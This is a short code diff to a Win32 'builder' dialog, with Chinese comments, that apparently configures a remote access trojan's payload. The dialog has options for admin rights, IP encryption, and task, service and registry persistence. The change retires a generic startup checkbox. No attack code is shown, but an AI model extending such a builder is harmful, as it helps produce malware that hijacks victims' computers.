@@ -114,7 +114,9 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
         
         // 默认选项
         CheckDlgButton(hDlg, IDC_CHECK_ADMIN, BST_CHECKED);
-        CheckDlgButton(hDlg, IDC_CHECK_STARTUP, BST_CHECKED);
+        // CheckDlgButton(hDlg, IDC_CHECK_STARTUP, BST_CHECKED); // 已废弃，使用具体的自启动选项
+        ShowWindow(GetDlgItem(hDlg, IDC_CHECK_STARTUP), SW_HIDE); // 隐藏控件
+
         CheckDlgButton(hDlg, IDC_CHECK_ENCRYPT_IP, BST_CHECKED);
 
         // 设置安装目录和程序名称默认值
@@ -171,7 +173,7 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
             int payloadIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_PAYLOAD), CB_GETCURSEL, 0, 0);
             
             bool runAsAdmin = (IsDlgButtonChecked(hDlg, IDC_CHECK_ADMIN) == BST_CHECKED);
-            bool startup = (IsDlgButtonChecked(hDlg, IDC_CHECK_STARTUP) == BST_CHECKED);
+            // bool startup = (IsDlgButtonChecked(hDlg, IDC_CHECK_STARTUP) == BST_CHECKED); // 已废弃
             bool taskStartup = (IsDlgButtonChecked(hDlg, IDC_CHECK_TASK_STARTUP) == BST_CHECKED);
             bool serviceStartup = (IsDlgButtonChecked(hDlg, IDC_CHECK_SERVICE_STARTUP) == BST_CHECKED);
             bool registryStartup = (IsDlgButtonChecked(hDlg, IDC_CHECK_REGISTRY_STARTUP) == BST_CHECKED);
@@ -269,7 +271,7 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                         
                         pAddr->bEncrypt = encryptIp ? 1 : 0;
                         pAddr->runasAdmin = (char)(runAsAdmin ? 1 : 0);
-                        pAddr->iStartup = startup ? 1 : 0;
+                        pAddr->iStartup = 0; // 已废弃字段，置0
                         pAddr->taskStartup = (char)(taskStartup ? 1 : 0);
                         pAddr->serviceStartup = (char)(serviceStartup ? 1 : 0);
                         pAddr->registryStartup = (char)(registryStartup ? 1 : 0);
